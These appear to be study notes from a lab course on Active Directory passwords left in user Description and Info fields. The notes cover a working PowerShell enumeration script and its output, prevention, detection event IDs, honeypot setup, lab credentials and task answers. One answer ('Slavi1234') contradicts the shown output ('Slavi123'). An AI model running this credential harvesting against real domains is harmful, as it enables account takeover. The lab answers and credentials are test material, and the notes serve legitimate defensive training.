# Credentials in Object Properties

First of all Object Properties are fields in the AD that describe the object (Users, Groups, Printers, Computers...).\
So for example an User Object would contain fields like: Name, Description, Email, MemberOf, Info...

When administrators create accounts, they fill in those properties. A common practice in the past was to add the user's (or service account's) password in the `Description` or `Info`properties. However **every domain user can see this information**.

***

## Attack

### PowerShell code used to return passwords from objects

```powershell
param(
    [string] $Domain
)

Function SearchUserClearTextInformation
{
    Param (
        [Parameter(Mandatory=$true)]
        [Array] $Terms,

        [Parameter(Mandatory=$false)]
        [String] $Domain
    )

    if ([string]::IsNullOrEmpty($Domain)) {
        $dc = (Get-ADDomain).RIDMaster
    } else {
        $dc = (Get-ADDomain $Domain).RIDMaster
    }

    $list = @()

    foreach ($t in $Terms)
    {
        $list += "(`$_.Description -like `"*$t*`")"
        $list += "(`$_.Info -like `"*$t*`")"
    }

    Get-ADUser -Filter * -Server $dc -Properties Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet |
        Where { Invoke-Expression ($list -join ' -OR ') } | 
        Select SamAccountName,Enabled,Description,Info,PasswordNeverExpires,PasswordLastSet | 
        fl
}

SearchUserClearTextInformation -Terms @("pwd", "pass", "pw", "kodeord") @PSBoundParameters
```

The script maybe has to be just runned or added manualy the parameter "pass"

### Running the script

```powershell-session
PS C:\Users\bob\Downloads> SearchUserClearTextInformation -Terms "pass"

SamAccountName       : bonni
Enabled              : True
Description          : pass: Slavi123
Info                 : 
PasswordNeverExpires : True
PasswordLastSet      : 05/12/2022 15.18.05
```

***

## Prevention

* Continuous assessments
* Educate employees
* Automate - dont let admins manually fill the object info, so they dont hardcode the password

***

## Detection

With event ID:  `4624`/`4625`and `4768`\
This are for successfull logon, failed logon, and TGP ticket, but the location of logon tells us if is is sus or not.

***

## Honeypot

Set the password in description and enjoy the honeypot.

For setting up a honeypot user, we need to ensure the followings:

* The password/credential is configured in the `Description` field, as it's the easiest to pick up by any adversary.
* The provided password is fake/incorrect.
* The account is enabled and has recent login attempts.
* While we can use a regular user or a service account, service accounts are more likely to have this exposed as administrators tend to create them manually. In contrast, automated HR systems often make employee accounts (and the employees have likely changed the password already).
* The account has the last password configured 2+ years ago (makes it more believable that the password will likely work).

Because the provided password is wrong, we would primarily expect failed logon attempts; three event IDs (`4625`, `4771`, and `4776`) can indicate this.

***

## Tasks

### Task 1

**Connect to the target and use a script to enumerate object property fields. What password can be found in the Description field of the bonni user?**

We RDP and see that there is no script "SearchUserClearTextInformation.ps1", so we create one.

```
New-Item -Type File -Name SearchUserClearTextInformation.ps1
```

Set execution policy to unrestricted

```
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
```

Run script

```
SearchUserClearTextInformation -Terms "pass"
```

**Answer: Slavi1234**

***

### Task 2

**Using the password discovered in the previous question, try to authenticate to DC1 as the bonni user. Is the password valid?**

Try to RDP if it works, grate, if not its a honeypot

**Answer: No**

***

### Task 3

**Connect to DC1 as 'htb-student:HTB\_@cademy\_stdnt!' and look at the logs in Event Viewer. What is the TargetSid of the bonni user?**

**Answer: S-1-5-21-1518138621-4282902758-752445584-3102**
